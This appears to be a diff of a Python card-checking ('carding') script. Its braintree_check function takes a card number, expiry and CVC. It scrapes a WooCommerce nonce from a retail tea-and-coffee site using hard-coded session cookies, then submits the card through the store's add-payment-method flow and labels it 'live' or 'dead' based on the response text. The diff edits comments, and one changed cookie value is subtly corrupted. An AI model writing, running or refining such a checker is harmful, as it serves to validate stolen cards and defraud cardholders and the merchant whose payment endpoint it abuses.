@@ -15,9 +15,7 @@ def generate_random_string(length=10):
     return ''.join(random.choice(chars) for _ in range(length))
 
 def braintree_check(ccn, mm, yy, cvc):
-    """Complete Braintree CC Check - Returns 'live' or 'dead'"""
-    
-    start_time = time.time()
+    """Braintree CC Check - Returns 'live' or 'dead'"""
     
     if len(yy) == 2:
         yy = '20' + yy
@@ -27,7 +25,7 @@ def braintree_check(ccn, mm, yy, cvc):
         'sbjs_migrations': '1418474375998%3D1',
         'sbjs_current_add': 'fd%3D2025-10-24%2007%3A53%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
         'sbjs_first_add': 'fd%3D2025-10-24%2007%3A53%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
         'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
         'woocommerce_current_currency': 'GBP',
         '_ga': 'GA1.1.1754434682.1761294191',
@@ -73,7 +71,7 @@ def braintree_check(ccn, mm, yy, cvc):
         page_response.raise_for_status()
         page_content = page_response.text
 
-        # Extract nonces
+        # Extract nonces using regex only - NO LXML NEEDED
         nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', page_content)
         if not nonce_match:
             return "dead"
@@ -205,7 +203,7 @@ def braintree_check(ccn, mm, yy, cvc):
 
         response_text = payment_response.text
 
-        # FINAL STATUS CHECK - BAS 2 OPTIONS
+        # FINAL STATUS CHECK
         if 'Nice! New payment method added' in response_text or 'Payment method successfully added.' in response_text:
             return "live"  # ✅ CARD APPROVED
         else:
